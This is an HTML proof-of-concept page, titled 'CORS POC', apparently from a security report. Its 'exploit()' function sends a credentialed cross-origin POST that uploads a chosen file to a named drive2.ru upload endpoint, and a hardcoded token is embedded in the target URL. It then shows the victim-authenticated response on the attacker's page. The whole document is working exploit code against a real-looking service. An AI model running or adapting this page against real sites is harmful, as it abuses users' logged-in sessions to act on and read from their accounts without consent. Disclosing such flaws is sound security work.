<!DOCTYPE html>
<html>
<head>
    <title>CORS POC</title>
    <style>
        body { font-family: monospace; max-width: 800px; margin: 20px; }
        textarea { width: 100%; height: 400px; padding: 10px; }
        input { width: 100%; padding: 8px; margin: 5px 0; }
        button { padding: 10px 20px; margin: 10px 0; }
    </style>
</head>
<body>
    <h2>CORS POC</h2>
    
    <label>Target URL:</label>
    <input type="text" id="target" value="https://upload.drive2.ru/_api/upload?.AMIG=.AMIG&token=AhgCSVVQVAjeuvYUvSOQCjDhAEAADNUKMMjAgABRT5XoNp_Sb3Vkc2Bn3PoAdNJrvma_">
    
    <label>Select File:</label>
    <input type="file" id="file">
    
    <button onclick="exploit()">Send Request</button>
    
    <h3>Response:</h3>
    <textarea id="output" readonly></textarea>

    <script>
        async function exploit() {
            const target = document.getElementById('target').value;
            const fileInput = document.getElementById('file');
            const output = document.getElementById('output');
            
            if (!fileInput.files.length) {
                output.value = 'Please select a file';
                return;
            }
            
            try {
                const formData = new FormData();
                formData.append('_', 'uploadSimple');
                formData.append('type', 'messengerimage');
                formData.append('file', fileInput.files[0]);
                
                const response = await fetch(target, {
                    method: 'POST',
                    credentials: 'include',
                    body: formData
                });
                
                const data = await response.json();
                output.value = JSON.stringify(data, null, 2);
            } catch (e) {
                output.value = 'Error: ' + e.message;
            }
        }
    </script>
</body>
</html>
